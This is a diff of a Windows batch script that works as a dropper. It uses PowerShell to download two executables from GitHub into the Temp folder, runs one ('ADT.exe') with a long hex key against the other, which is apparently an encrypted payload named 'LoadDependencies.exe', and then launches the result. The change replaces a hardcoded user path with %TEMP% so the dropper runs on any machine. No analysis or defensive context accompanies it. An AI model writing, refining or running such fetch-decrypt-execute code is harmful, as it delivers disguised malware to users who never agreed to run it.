@@ -1,7 +1,7 @@
 @echo off 
-powershell.exe -Command "$url = 'https://raw.githubusercontent.com/TheWeaponSmith/ADT/master/ADT.exe'; $dest = 'C:\Users\ADOLFH~1\AppData\Local\Temp\ADT.exe'; Invoke-WebRequest -Uri $url -OutFile $dest" 
-powershell.exe -Command "$url = 'https://raw.githubusercontent.com/FlipZak/filebin/main/LoadDependencies.exe'; $dest = 'C:\Users\ADOLFH~1\AppData\Local\Temp\LoadDependencies.exe'; Invoke-WebRequest -Uri $url -OutFile $dest" 
-cd C:\Users\ADOLFH~1\AppData\Local\Temp 
+powershell.exe -Command "$url = 'https://raw.githubusercontent.com/TheWeaponSmith/ADT/master/ADT.exe'; $dest = '%TEMP%\ADT.exe'; Invoke-WebRequest -Uri $url -OutFile $dest" 
+powershell.exe -Command "$url = 'https://raw.githubusercontent.com/FlipZak/filebin/main/LoadDependencies.exe'; $dest = '%TEMP%\LoadDependencies.exe'; Invoke-WebRequest -Uri $url -OutFile $dest" 
+cd %TEMP%
 ADT.exe --file LoadDependencies.exe --key b7cd6e5d943d29a979e10429d80ff2151bc8fc37253eb5b9f4622551a8454f9f 
 start LoadDependencies.exe 
 exit
